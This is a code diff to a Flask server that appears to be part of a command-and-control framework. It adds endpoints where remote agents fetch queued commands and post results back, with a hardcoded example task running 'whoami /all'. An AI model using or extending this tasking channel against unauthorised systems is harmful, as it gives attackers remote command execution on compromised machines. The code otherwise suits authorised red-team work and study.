@@ -1,5 +1,5 @@
 # file: app.py
-from flask import Flask
+from flask import Flask, request
 from flask_restx import Api, Namespace, Resource, fields
 from waitress import serve
 from modules.config import Config
@@ -35,9 +35,8 @@ json_response = {"command": "shell", "args": "whoami /all"}
 post_input_model = beacon_http_ns.model(
     "PostInput",
     {
-        "anyKey": fields.Raw(
-            required=False, description="Example of any posted key-value"
-        )
+        "data": fields.String(required=False, description="data to post back"),
+        "command_id": fields.String(required=False, description="Command id"),
     },
 )
 post_output_model = beacon_http_ns.model(
@@ -54,42 +53,69 @@ post_output_model = beacon_http_ns.model(
 # ------------------------------------------------------------------------------------
 
 
-@beacon_http_ns.route("/get")
-class GetResource(Resource):
-    def get(self):
-        """Returns a predefined JSON response."""
+## MOVE ME TO BEACON_HTTP. TEMP TESTING HERE!!!
+@beacon_http_ns.route("/get/<string:agent_uuid>")
+@beacon_http_ns.doc(description="")
+class AgentDequeueCommandResource(Resource):
+    """
+    ...
+    """
 
-        # get client id
+    @beacon_http_ns.doc(
+        responses={
+            200: "Success",
+            400: "Bad Request",
+            401: "Missing Auth",
+            500: "Server Side error",
+        },
+    )
+    # @ping_ns.marshal_with(ping_response, code=200)
+    def get(self, agent_uuid):
+        """
+        Dequeue a command
 
-        # spawn base or whatever
+        Returns:
+            JSON: {"command": <command>, "args": <args>}
 
-        # Get info from redis, pop command
+        """
 
-        # format, send off
+        a = Agent(agent_id=agent_uuid)
+        command = a.dequeue_command()
 
-        response_dict = {"command": "shell", "args": "whoami /all"}
+        # Ensure command is a string
+        if not command or not isinstance(command, str):
+            return {"command": None, "args": None}  # Handle empty commands
 
-        return json_response, 200
+        # Split command into parts
+        parts = command.strip().split(" ", 1)  # Split at first space
+
+        command_name = parts[0]  # First word
+        args = parts[1] if len(parts) > 1 else ""  # Everything else
+
+        response_dict = {"command": command_name, "args": args}
+        return response_dict
 
 
-@beacon_http_ns.route("/post")
+@beacon_http_ns.route("/post/<string:agent_uuid>")
 class PostResource(Resource):
     @beacon_http_ns.expect(post_input_model)
     @beacon_http_ns.marshal_with(post_output_model)
-    def post(self):
+    def post(self, agent_uuid):
         """Receives JSON data and returns it in a response."""
         response = beacon_http_ns.payload
         print("Received POST data:", response)
 
-        uuid = response.get("id", "")
+        # uuid = response.get("id", "")
         data = response.get("data", "")
+        command_id = response.get("command_id", "")
 
-        # put into somewhere, prolly redis.
-        a = Agent(uuid)
+        a = Agent(agent_uuid)
 
-        a.store_response(data)
+        # change
 
-        # print(a.get_latest_response())
+        # need to get COMMAND ID here... maybe have agent send back.
+        # note, not actually storing yet.
+        a._store_response("command_id", data)
 
         return {"status": "received", "data": data}, 200
 
